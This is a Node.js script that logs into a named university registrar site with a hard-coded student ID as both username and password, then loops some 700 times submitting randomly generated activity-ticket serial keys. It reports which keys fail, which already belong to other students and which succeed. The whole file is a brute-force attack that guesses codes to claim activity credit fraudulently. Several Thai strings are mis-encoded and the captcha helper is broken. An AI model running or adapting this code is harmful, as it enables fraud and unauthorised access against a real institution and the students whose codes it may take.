const request = require('request');
const cheerio = require('cheerio');
const clc = require('cli-color');
//var fs = require('fs');
let $;
let url_student = 'http://reg.sru.ac.th/registrar/student.asp?';
let url_event = 'http://reg.sru.ac.th/registrar/student_activity.asp?f_cmd=1';

 for(i=0;i<=700;i++){     
let key = "0020160162"+rand_key(12)
console.log(clc.blue(key))
login('6104305001011','6104305001011',key)
  
 }
 
function rand_key(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }
function capcha(){
  request('https://reg.sru.ac.th/registrar/login.asp', function (error, response, body) {
  //console.error('error:', error); //
  //console.log('statusCode:', response && response.statusCode); 
  //console.log('body:', body); 
  $ = cheerio.load(body);
  var succ_cap = $('input[name="BUILDKEY"]').val()
  return succ_cap
 // console.log(succ_cap);
});  
}
let username
function login(username,password,key){
  var options = { method: 'POST',
  url: 'https://reg.sru.ac.th/registrar/validate.asp',
  
  form: {
        'f_uid':username,
        'f_pwd':password,
        'BUILDKEY':capcha(),

  }};
  request(options, function (error, response, body) {
    if (error) throw new Error(error);
    //console.log(body)
    var cookie = response.headers['set-cookie'];
    //console.log(response.headers['set-cookie'])
    $ = cheerio.load(body);
    var link = $('a').attr('href');
    let link_succ = link.split('?')
    let url_split = link_succ[1];
    console.log('url_split:'+url_split)
    var options = { method: 'GET',
    url: url_student+url_split,
    headers: 
     { 'Cookie': cookie,
       accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
       'sec-fetch-user': '?1',
       'sec-fetch-mode': 'navigate',
       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
       'upgrade-insecure-requests': '1' } };
  
  request(options, function (error, response, body) {
    console.log('statusCode:', response && response.statusCode); 
    if (!error && response.statusCode == 200) {
    $ = cheerio.load(body);
    var s = $("b").eq(0)
    var  succ = s.text().split(' ')
    
    if(succ[0] == username){
        console.log('login success');
        console.log(succ[0])
        var options = { method: 'POST',
  url: url_event,
  headers: 
   { 'Cookie': cookie,
     accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
     'content-type': 'application/x-www-form-urlencoded',
     'upgrade-insecure-requests': '1',
     origin: 'http://reg.sru.ac.th' },
  form: {'activityticketcode':key} };

request(options, function (error, response, body) {
  if (error) throw new Error(error);
  $ = cheerio.load(body);
  var res = $("b").eq(3)
  console.log(res.text());

  if(res.text()=='*** ��辺 Serial Key ��к� ***'){
      console.log(clc.red('Serial Key not found in the system'))

  }else{
      if(res.text()=='*** Serial Key ��ӡ��ŧ����¹�Ѻ�ؤ��������� ***'){
        console.log(clc.yellow('The Serial Key has been registered with other people.'))

      }else{
      console.log(clc.green('success serial key'))
      }

  }
});








    }else{
        console.log('login fail');

    }
    //console.log(body);
    }
  });
  


  })

}